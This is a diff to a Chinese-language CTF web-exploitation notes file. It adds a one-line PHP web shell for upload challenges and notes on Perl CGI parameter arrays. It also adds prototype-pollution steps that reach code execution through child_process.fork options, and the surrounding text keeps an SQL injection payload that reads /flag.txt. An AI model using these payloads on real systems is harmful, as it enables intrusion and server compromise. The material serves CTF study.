@@ -493,11 +493,12 @@ Content-Disposition: form-data; name="submit"
 上传
 ------WebKitFormBoundaryXSmMYBArrqu5ODCM--
 ```
-
+最近找到了个更短的：
+```php
+<?=`$_GET[0]`?>
+```
 47. sql注入如果没有过滤load_file，就能直接读取文件。例如：
-
 - ',\`address\`=(select(load_file('/flag.txt')))#
-
 可以直接在不爆表爆字段等任何信息的情况下直接读取到flag.txt文件。
 
 48.  [linux proc/pid/信息说明](https://blog.csdn.net/shenhuxi_yu/article/details/79697792)。/proc/self/cmdline可以读取当前进程执行的命令，如果是python的网站可以借此读取到网站的文件名。linux中如果打开了一个文件且没有关闭的话，`/proc/pid/fd/文件描述符`  这个目录会包含了进程打开的每一个文件，比如/proc/pid/fd/3读取第一个打开的文件。在python里使用open打开的只要不close，都能猜文件描述符而读取到。例题:[[网鼎杯 2020 白虎组]PicDown](https://blog.csdn.net/wuyaowangchuan/article/details/114540227)
@@ -2583,7 +2584,7 @@ SuperSerial不处理函数，所以没法像python的pickle那样直接RCE。
 257. [Future Disk](https://github.com/sigpwny/UIUCTF-2023-Public/tree/main/challenges/web/futuredisk),[wp](https://bronson113.github.io/2023/07/03/uiuctf-2023-writeups.html#future-disk-12-),[wp2](https://www.youtube.com/watch?v=Es2LzEQGwDc&t=724s)(视频)
 - gzip文件格式详解：https://commandlinefanatic.com/cgi-bin/showarticle.cgi?article=art053
 - curl命令有个`--continued-at`选项，其实本质上是使用了range头
-- 利用binary search在超大gzip文件中找到储存指定内容的block并使用zlib解码内容（或者使用这个[文章](https://pyokagan.name/blog/2019-10-18-zlibinflate/)里的deflate）。 Since the file is mostly zero, we can assume the first 9 blocks will follow a pretty regular sequence. then there will be one block of a irregular size to store the flag, and the rest of the block back to the regular format. This means that if we can find the block header at the location we expects it, we haven’t reach the block containing the flag. Conversely, if we can’t find the block header, we have passed the flag block. The only challenge now is to calculate where the header bytes are.
+- 利用binary search在超大gzip文件中找到储存指定内容的block并使用zlib解码内容（或者使用这个[文章](https://pyokagan.name/blog/2019-10-18-zlibinflate/)里的deflate）。 Since the file is mostly zero, we can assume the first 9 blocks will follow a pretty regular sequence. then there will be one block of a irregular size to store the flag, and the rest of the block back to the regular format. This means that if we can find the block header at the location we expects it, we haven't reach the block containing the flag. Conversely, if we can't find the block header, we have passed the flag block. The only challenge now is to calculate where the header bytes are.
 - 其他wp： https://hackmd.io/@pilvar/ByznZMLF3
 258. [Rose](https://hackmd.io/@taiwhis/tenable_ctf_2023#Rose)
 - flask的flask_login以及`@login_required`装饰器依赖客户端的session cookie。只要获取到secret key后，即可伪造登录后的cookie。`{'_id': '733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96', '_user_id': '1'}`. `_id`和`_user_id`是必须的，用于标记已登录（或者说绕过`@login_required`保护的页面），除此之外还可以加其他题目需要的内容
@@ -2937,3 +2938,10 @@ wp里还有将要泄露的内容转换为符合域名规范的16进制的进阶p
     [+] %s
     A humble %s format string conversion specification
     ```
+301. [CGI Fridays](https://learn-cyber.net/writeup/CGI-Fridays)
+- perl中`@_`表示传入subroutine(跟函数类似，但是不返回值)的参数所组成的数组
+- perl cgi的`CGI::Minimal->param("paramname")`获取网页名为paramname的query（如get传参）的值。当这个值有多个，如`?param=a&param=b`时，会返回全部值所组成的数组
+- subroutine不支持传数组作为参数，如果硬要传结果是把数组拆开作为不同的参数。`func(array_size2)`等同于`func(array[0],array[1])`
+302. [Breaking Grad](https://d4rkstat1c.medium.com/breaking-grad-hackthebox-write-up-9e780ff2b68b)
+- js原型链污染。递归merge（clone）时，除了直接用键名`__proto__`污染，也可以间接使用`constructor`：`{'constructor':{'prototype':{'target_property':'value'}}`
+- 原型链污染可以污染`child_process.fork`的options。可以污染NODE_OPTIONS让其读取environ文件，然后污染env为要执行的node js脚本。或者参考 https://y3a.github.io/2021/06/15/htb-breaking-grad/ ，污染execPath和execArgv
